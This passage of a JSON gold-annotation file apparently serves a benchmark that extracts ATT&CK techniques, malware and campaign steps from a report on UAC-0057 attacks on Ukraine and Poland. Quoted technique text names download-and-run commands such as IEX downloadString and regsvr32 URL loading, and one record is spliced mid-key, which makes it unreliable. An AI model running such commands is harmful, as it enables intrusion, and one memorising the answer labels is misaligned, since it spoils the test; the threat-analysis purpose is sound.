separate, seemingly benign files that only reveal malicious functionality when reassembled.\n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.", "url": "https://attack.mitre.org/techniques/T1027"}, "rel_count": 5, "sequence": null, "extra": {}, "fp": "776121da4bd3"}, {"id": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab", "kind": "entity", "type": "attack-pattern", "name": "Regsvr32", "ext_id": "T1218.010", "label": "gold:required", "quotes": [{"text": "Once executed, the macro drops a DLL which is loaded using `regsvr32.exe`.", "anchor": {"status": "exact", "occurrences": [{"start": 4998, "end": 5072, "section": ["Infection chains", "Infection chain which targeted Ukraine"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["stealth"], "attack": {"status": "ok", "msg": "T1218.010 Regsvr32 (ATT&CK v20.0)", "official": "Regsvr32", "description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft.\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. This variation of the technique is often referred to as a \"Squiblydoo\" and has been used in campaigns targeting governments.\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.", "url": "https://attack.mitre.org/techniques/T1218/010"}, "rel_count": 2, "sequence": null, "extra": {}, "fp": "263bb90df9ba"}, {"id": "attack-pattern--be055942-6e63-49d7-9fa1-9cb7d8a8f3f4", "kind": "entity", "type": "attack-pattern", "name": "Bidirectional Communication", "ext_id": "T1102.002", "label": "gold:required", "quotes": [{"text": "These downloaders use Slack as a C2 server, leveraging the webhook mechanism to upload data. Once the data is uploaded, they immediately attempt to download a next stage from a download URL ending with `.jpg`", "anchor": {"status": "exact", "occurrences": [{"start": 19659, "end": 19867, "section": ["Infection chains", "Infection chain which targeted Poland", "First stage C# DLL implants"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["command-and-control"], "attack": {"status": "ok", "msg": "T1102.002 Bidirectional Communication (ATT&CK v20.0)", "official": "Bidirectional Communication", "description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.", "url": "https://attack.mitre.org/techniques/T1102/002"}, "rel_count": 2, "sequence": null, "extra": {"x_gold_context": "Bidirectionnel : les données sont envoyées par webhook Slack, puis le stade suivant est téléchargé. L'annexe IOC donne des URL files.slack[.]com comme « C2 URL (Slack) », donc le téléchargement passe aussi par Slack."}, "fp": "049da1d53990"}, {"id": "attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384", "kind": "entity", "type": "attack-pattern", "name": "Security Software Discovery", "ext_id": "T1518.001", "label": "gold:required", "quotes": [{"text": "installed antivirus product name and installation date (using a WMI query);", "anchor": {"status": "exact", "occurrences": [{"start": 10692, "end": 10767, "section": ["Infection chains", "Infection chain which targeted Ukraine", "First stage C# DLL implants", "Variant 1 (`DefenderProtectionScope.log`)"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["discovery"], "attack": {"status": "ok", "msg": "T1518.001 Security Software Discovery (ATT&CK v20.0)", "official": "Security Software Discovery", "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, reg query with Reg, dir with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.", "url": "https://attack.mitre.org/techniques/T1518/001"}, "rel_count": 4, "sequence": null, "extra": {}, "fp": "17c6dfb29b00"}, {"id": "attack-pattern--d1fcf083-a721-4223-aedf-bf8960798d62", "kind": "entity", "type": "attack-pattern", "name": "Windows Command Shell", "ext_id": "T1059.003", "label": "gold:required", "quotes": [{"text": "the implant saves the payload to that path and runs it using the provided command (spawned via `cmd.exe /c`)", "anchor": {"status": "exact", "occurrences": [{"start": 14767, "end": 14875, "section": ["Infection chains", "Infection chain which targeted Ukraine", "First stage C# DLL implants", "Variant 2 (`sdw9gobh0n.log`, `0x00bac729fe.log`)"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["execution"], "attack": {"status": "ok", "msg": "T1059.003 Windows Command Shell (ATT&CK v20.0)", "official": "Windows Command Shell", "description": "Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.", "url": "https://attack.mitre.org/techniques/T1059/003"}, "rel_count": 3, "sequence": null, "extra": {}, "fp": "1dd3d246ce49"}, {"id": "attack-pattern--deb98323-e13f-4b0c-8d94-175379069062", "kind": "entity", "type": "attack-pattern", "name": "Software Packing", "ext_id": "T1027.002", "label": "gold:required", "quotes": [{"text": "has been packed with _UPX_", "anchor": {"status": "exact", "occurrences": [{"start": 22002, "end": 22028, "section": ["Infection chains", "Infection chain which targeted Poland", "First stage C++ DLL implant"]}, {"start": 26247, "end": 26273, "section": ["Infection chains", "Infection chain which targeted Poland", "Infection chain variant leading to Cobalt Strike"]}]}}], "flags": [{"level": "warn", "code": "quote-ambiguous", "msg": "Citation : ambiguë : 2 occurrences dans l'article. Vérifier que le passage concerne bien cette source."}], "severity": 2, "description": null, "aliases": [], "tactics": ["stealth"], "attack": {"status": "ok", "msg": "T1027.002 Software Packing (ATT&CK v20.0)", "official": "Software Packing", "description": "Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.\n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.", "url": "https://attack.mitre.org/techniques/T1027/002"}, "rel_count": 4, "sequence": null, "extra": {}, "fp": "53700b91c200"}, {"id": "attack-pattern--df8b2a25-8bdf-4856-953c-a04372b1c161", "kind": "entity", "type": "attack-pattern", "name": "Web Protocols", "ext_id": "T1071.001", "label": "gold:required", "quotes": [{"text": "sent as a cookie (`mod0api`) value to the C2 server via an HTTP POST request", "anchor": {"status": "exact", "occurrences": [{"start": 13811, "end": 13887, "section": ["Infection chains", "Infection chain which targeted Ukraine", "First stage C# DLL implants", "Variant 2 (`sdw9gobh0n.log`, `0x00bac729fe.log`)"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["command-and-control"], "attack": {"status": "ok", "msg": "T1071.001 Web Protocols (ATT&CK v20.0)", "official": "Web Protocols", "description": "Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.", "url": "https://attack.mitre.org/techniques/T1071/001"}, "rel_count": 4, "sequence": null, "extra": {}, "fp": "21bc4f4ca6e5"}, {"id": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67", "kind": "entity", "type": "attack-pattern", "name": "Visual Basic", "ext_id": "T1059.005", "label": "gold:required", "quotes": [{"text": "These archives contain XLS spreadsheets with a VBA macro that drops and loads a DLL.", "anchor": {"status": "exact", "occurrences": [{"start": 3780, "end": 3864, "section": ["Infection chains"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["execution"], "attack": {"status": "ok", "msg": "T1059.005 Visual Basic (ATT&CK v20.0)", "official": "Visual Basic", "description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads (which may also involve Mark-of-the-Web Bypass to enable execution).", "url": "https://attack.mitre.org/techniques/T1059/005"}, "rel_count": 2, "sequence": null, "extra": {}, "fp": "1899a6ea957d"}, {"id": "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add", "kind": "entity", "type": "attack-pattern", "name": "Ingress Tool Transfer", "ext_id": "T1105", "label": "gold:required", "quotes": [{"text": "periodically attempts to retrieve a next stage from the C2", "anchor": {"status": "exact", "occurrences": [{"start": 5832, "end": 5890, "section": ["Infection chains", "Infection chain which targeted Ukraine"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["command-and-control"], "attack": {"status": "ok", "msg": "T1105 Ingress Tool Transfer (ATT&CK v20.0)", "official": "Ingress Tool Transfer", "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer).\n\nOn Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.  A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi. After downloading a file, a threat actor may attempt to verify its integrity by checking its hash value (e.g., via `certutil -hashfile`).\n\nAdversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by User Execution (typically after interacting with Phishing lures).\n\nFiles can also be transferred using various Web Services as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.", "url": "https://attack.mitre.org/techniques/T1105"}, "rel_count": 4, "sequence": null, "extra": {}, "fp": "4ecd4523fdb8"}, {"id": "campaign--4d9323dc-aab6-5d20-8c99-e01c47235298", "kind": "entity", "type": "campaign", "name": "Campagne ciblant la Pologne (avril-mai 2025)", "ext_id": null, "label": "gold:required", "quotes": [{"text": "In this section, we describe infection chains targeting Poland in April and May 2025.", "anchor": {"status": "exact", "occurrences": [{"start": 15154, "end": 15239, "section": ["Infection chains", "Infection chain which targeted Poland"]}]}}], "flags": [], "severity": 0, "description": "XLS à macro VBA obfusquée par MacroPack déposant un downloader C# (C2 Slack, avril 2025), un downloader C++ (mai 2025) ou une chaîne menant à Cobalt Strike (mai 2025).", "aliases": [], "tactics": [], "attack": null, "rel_count": 38, "sequence": [{"order": 1, "summary": "Ouverture du XLS : la macro VBA obfusquée (MacroPack) dépose un CAB ou une DLL chiffrée, puis l'extrait ou la déchiffre.", "techniques": ["T1059.005", "T1027", "T1140"], "techniques_acceptable": ["T1204.002"]}, {"order": 2, "summary": "Chargement de la DLL par rundll32, via un LNK lancé par ShellExec_RunDLL ou via ShellExecute.", "techniques": ["T1218.011"]}, {"order": 3, "summary": "Downloader C++ uniquement : persistance par la tâche planifiée \\UpdateSDX (TaskScheduler COM). Le downloader C# n'a pas de persistance.", "techniques": ["T1053.005", "T1559.001"]}, {"order": 4, "summary": "Collecte d'informations système (OS, hôte, utilisateur, antivirus via WMI, IP externe).", "techniques": ["T1082", "T1033", "T1518.001", "T1047", "T1016"]}, {"order": 5, "summary": "Envoi au C2 : webhook Slack (données chiffrées RC4 et encodées Base64) ou HTTP POST (JSON Base64).", "techniques": ["T1102.002", "T1071.001", "T1573.001", "T1132.001", "T1041"], "techniques_acceptable": ["T1567.004"]}, {"order": 6, "summary": "Téléchargement et déchiffrement (RC4 ou XOR) du stade suivant, exécuté via WScript.Shell (COM) ou via une tâche planifiée RuntimeBroker supprimée ensuite.", "techniques": ["T1105", "T1140", "T1559.001", "T1053.005", "T1218.011"], "techniques_acceptable": ["T1070", "T1036.005"]}, {"order": 7, "summary": "Variante (mai 2025) : DiagnExp.dll (UPX) écrit DiagnosticComponents.dll, l'exécute par la tâche planifiée \\ExpDiagnosticDataSettings et charge un Beacon Cobalt Strike.", "techniques": ["T1027.002", "T1053.005"], "concurrent": true}], "extra": {}, "fp": "9cc812673c25"}, {"id": "campaign--75f04b04-6c83-5c39-bc81-27d2ad361e01", "kind": "entity", "type": "campaign", "name": "Campagne ciblant l'Ukraine (mai-juillet 2025)", "ext_id": null, "label": "gold:required", "quotes": [{"text": "We identified a cluster of compressed archive files which were likely intended to be delivered to Ukrainian targets between late May 2025 and late July 2025.", "anchor": {"status": "exact", "occurrences": [{"start": 3451, "end": 3608, "section": ["Infection chains"]}]}}], "flags": [], "severity": 0, "description": "Archives contenant des XLS à macro VBA qui déposent et chargent un downloader C# (regsvr32), de fin mai à fin juillet 2025.", "aliases": [], "tactics": [], "attack": null, "rel_count": 30, "sequence": [{"order": 1, "summary": "Ouverture du XLS (archive RAR/ZIP) : la macro VBA, partiellement obfusquée (MacroPack), écrit la DLL, en clair, déchiffrée ou via un CAB extrait par expand.exe.", "techniques": ["T1059.005", "T1027", "T1140"], "techniques_acceptable": ["T1204.002"]}, {"order": 2, "summary": "Chargement de la DLL par regsvr32 /u /s, directement (ShellExecute) ou via un LNK « Protection overview.lnk ».", "techniques": ["T1218.010"]}, {"order": 3, "summary": "Le downloader C# s'installe en persistance dans la clé Run de l'utilisateur.", "techniques": ["T1547.001"], "techniques_acceptable": ["T1036.005"]}, {"order": 4, "summary": "Collecte d'informations système (OS, hôte, utilisateur, antivirus via WMI, IP externe).", "techniques": ["T1082", "T1033", "T1518.001", "T1047", "T1016"]}, {"order": 5, "summary": "Envoi des informations, encodées en Base64, au C2 par HTTP POST.", "techniques": ["T1071.001", "T1132.001", "T1041"], "techniques_acceptable": ["T1029"]}, {"order": 6, "summary": "Récupération périodique du stade suivant, exécuté via rundll32 ou cmd.exe /c, avec persistance Run optionnelle.", "techniques": ["T1105", "T1218.011", "T1059.003", "T1547.001"]}], "extra": {}, "fp": "a0975b63a572"}, {"id": "intrusion-set--4a4be33a-2644-5033-8027-072d15b4ac3d", "kind": "entity", "type": "intrusion-set", "name": "UAC-0057", "ext_id": null, "label": "gold:required", "quotes": [{"text": "associated with _UAC-0057_ (also known as _UNC1151_ , _FrostyNeighbor_ or _Ghostwriter_), a cyber espionage actor", "anchor": {"status": "exact", "occurrences": [{"start": 768, "end": 881, "section": ["Summary"]}]}}], "flags": [], "severity": 0, "description": "Acteur de cyberespionnage auquel l'article rapproche les deux campagnes, sans attribution de haute confiance.", "aliases": ["UNC1151", "FrostyNeighbor", "Ghostwriter"], "tactics": [], "attack": null, "rel_count": 2, "sequence": null, "extra": {}, "fp": "59bad91bc36f"}, {"id": "location--67f998ac-2c9a-5b70-9459-63fb55c949d5", "kind": "entity", "type": "location", "name": "Ukraine", "ext_id": null, "label": "gold:required", "quotes": [{"text": "we believe that organisations or individuals in Ukraine and in Poland were the intended targets", "anchor": {"status": "exact", "occurrences": [{"start": 33909, "end": 34004, "section": ["Targets"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": [], "attack": null, "rel_count": 1, "sequence": null, "extra": {}, "fp": "4c7eb4cb5d13"}, {"id": "location--a889ef92-b9f5-5f60-a215-6845c45e7d25", "kind": "entity", "type": "location", "name": "Poland", "ext_id": null, "label": "gold:required", "quotes": [{"text": "we believe that organisations or individuals in Ukraine and in Poland were the intended targets", "anchor": {"status": "exact", "occurrences": [{"start": 33909, "end": 34004, "section": ["Targets"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": [], "attack": null, "rel_count": 1, "sequence": null, "extra": {}, "fp": "8faa3bd2bda5"}, {"id": "malware--6e968be9-4620-57b6-8a6e-e51992137374", "kind": "entity", "type": "malware", "name": "C++ downloader", "ext_id": null, "label": "gold:required", "quotes": [{"text": "The implant is a C++ DLL which has a single export named `Start` and has been packed with _UPX_.", "anchor": {"status": "exact", "occurrences": [{"start": 21933, "end": 22029, "section": ["Infection chains", "Infection chain which targeted Poland", "First stage C++ DLL implant"]}]}}], "flags": [], "severity": 0, "description": "Implant de premier stade C++ (SDXHelp.dll) packé avec UPX ; persistance par tâche planifiée, collecte d'informations système, téléchargement d'une DLL chiffrée par XOR. Campagne ciblant la Pologne (mai 2025).", "aliases": ["SDXHelp.dll", "First stage C++ DLL implant"], "tactics": [], "attack": null, "rel_count": 18, "sequence": null, "extra": {}, "fp": "790ce6daba70"}, {"id": "malware--a7881f21-e978-4fe4-af56-92c9416a2616", "kind": "entity", "type": "malware", "name": "Cobalt Strike", "ext_id": "S0154", "label": "gold:required", "quotes": [{"text": "acts as a loader for a _Cobalt Strike Beacon_", "anchor": {"status": "exact", "occurrences": [{"start": 26849, "end": 26894, "section": ["Infection chains", "Infection chain which targeted Poland", "Infection chain variant leading to Cobalt Strike"]}]}}], "flags": [], "severity": 0, "description": "Beacon chargé par DiagnosticComponents.dll dans une variante de la chaîne d'infection ciblant la Pologne.", "aliases": ["Cobalt Strike Beacon", "Beacon"], "tactics": [], "attack": {"status": "ok", "msg": "S0154 Cobalt Strike (ATT&CK v20.0)", "official": "Cobalt Strike", "description": "Cobalt Strike is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.\n\nIn addition to its own capabilities, Cobalt Strike leverages the capabilities of other well-known tools such as Metasploit and Mimikatz.", "url": "https://attack.mitre.org/software/S0154"}, "rel_count": 2, "sequence": null, "extra": {"x_gold_type nd": "entity", "type": "tool", "name": "ConfuserEx", "ext_id": null, "label": "gold:required", "quotes": [{"text": "is written in C# and obfuscated using _ConfuserEx_", "anchor": {"status": "exact", "occurrences": [{"start": 5613, "end": 5663, "section": ["Infection chains", "Infection chain which targeted Ukraine"]}]}}], "flags": [], "severity": 0, "description": "Obfuscateur .NET appliqué aux downloaders C#.", "aliases": [], "tactics": [], "attack": null, "rel_count": 3, "sequence": null, "extra": {}, "fp": "820272a65a52"}, {"id": "tool--2a668b3b-def6-54ad-8cd6-91ee5054e348", "kind": "entity", "type": "tool", "name": "MacroPack", "ext_id": null, "label": "gold:required", "quotes": [{"text": "_MacroPack_ (an offensive security tool which is available on GitHub)", "anchor": {"status": "exact", "occurrences": [{"start": 8368, "end": 8437, "section": ["Infection chains", "Infection chain which targeted Ukraine", "XLS spreadsheets", "ПЛАН наповнення СФ_ЗМІНЕНИЙ.xls"]}]}}], "flags": [], "severity": 0, "description": "Outil offensif public utilisé pour obfusquer les macros VBA.", "aliases": [], "tactics": [], "attack": null, "rel_count": 3, "sequence": null, "extra": {}, "fp": "f45da20e77c6"}, {"id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e", "kind": "entity", "type": "attack-pattern", "name": "Malicious File", "ext_id": "T1204.002", "label": "gold:acceptable", "quotes": [{"text": "Initial access: consistent use of weaponized XLS spreadsheets with VBA macros", "anchor": {"status": "exact", "occurrences": [{"start": 27411, "end": 27488, "section": ["Infection chains", "Similarities across the different campaigns"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["execution"], "attack": {"status": "ok", "msg": "T1204.002 Malicious File (ATT&CK v20.0)", "official": "Malicious File", "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, .reg, and .iso.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.\n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.", "url": "https://attack.mitre.org/techniques/T1204/002"}, "rel_count": 2, "sequence": null, "extra": {}, "fp": "35430134b8bb"}, {"id": "attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466", "kind": "entity", "type": "attack-pattern", "name": "Scheduled Transfer", "ext_id": "T1029", "label": "gold:acceptable", "quotes": [{"text": "The implant attempts to send the collected information to the C2 server every 10 minutes.", "anchor": {"status": "exact", "occurrences": [{"start": 11746, "end": 11835, "section": ["Infection chains", "Infection chain which targeted Ukraine", "First stage C# DLL implants", "Variant 1 (`DefenderProtectionScope.log`)"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["exfiltration"], "attack": {"status": "ok", "msg": "T1029 Scheduled Transfer (ATT&CK v20.0)", "official": "Scheduled Transfer", "description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel or Exfiltration Over Alternative Protocol.", "url": "https://attack.mitre.org/techniques/T1029"}, "rel_count": 2, "sequence": null, "extra": {}, "fp": "bc02904fa75d"}, {"id": "attack-pattern--43f2776f-b4bd-4118-94b8-fee47e69676d", "kind": "entity", "type": "attack-pattern", "name": "Exfiltration Over Webhook", "ext_id": "T1567.004", "label": "gold:acceptable", "quotes": [{"text": "These downloaders use Slack as a C2 server, leveraging the webhook mechanism to upload data.", "anchor": {"status": "exact", "occurrences": [{"start": 19659, "end": 19751, "section": ["Infection chains", "Infection chain which targeted Poland", "First stage C# DLL implants"]}]}}], "flags": [], "severity": 0, "description": null, "aliases": [], "tactics": ["exfiltration"], "attack": {"status": "ok", "msg": "T1567.004 Exfiltration Over Webhook (ATT&CK v20.0)", "official": "Exfiltration Over Webhook", "description": "Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server. Many public and commercial services, such as Discord, Slack, and `webhook.site`, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello. When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application.\n\nAdversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated Automated Exfiltration of emails, chat messages, and other data. Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.\n\nAccess to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.", "url": "https://attack.mitre.org/techniques/T1567/004"}, "rel_count": 2, "sequence": null, "extra": {}, "fp": "fb19c9f16eb0"}, {"id": "malware--f8cf7f73-12b0-58e3-9ee4-db5af6469598", "kind": "entity", "type": "malware", "name": "DiagnExp.dll", "ext_id": null, "label": "gold:required", "quotes": [{"text": "internal name: `DiagnExp.dll`) is written in C++, has a single export, `Start`, and has been packed with _UPX_", "anchor": {"status": "exact", "occurrences": [{"start": 26163, "end": 26273, "section": ["Infection chains", "Infection chain which targeted Poland", "Infection chain variant leading to Cobalt Strike"]}]}}], "flags": [], "severity": 0, "description": "Dropper C++ (mrasp86.dll) packé avec UPX : écrit DiagnosticComponents.dll et l'exécute via une tâche planifiée. Variante Cobalt Strike de la campagne ciblant la Pologne (mai 2025).", "aliases": ["mrasp86.dll", "C++ dropper"], "tactics": [], "attack": null, "rel_count": 5, "sequence": null, "extra": {}, "fp": "3b27d768f4a5"}, {"id": "malware--b7570bd3-502a-5407-90f4-0809bc66e6d5", "kind": "entity", "type": "malware", "name": "DiagnosticComponents.dll", "ext_id": null, "label": "gold:required", "quotes": [{"text": "internal name: `inj_p.dll`) also has a single export named `Start`, and acts as a loader for a _Cobalt Strike Beacon_", "anchor": {"status": "exact", "occurrences": [{"start": 26777, "end": 26894, "section": ["Infection chains", "Infection chain which targeted Poland", "Infection chain variant leading to Cobalt Strike"]}]}}], "flags": [], "severity": 0, "description": "Loader C++ d'un Beacon Coba
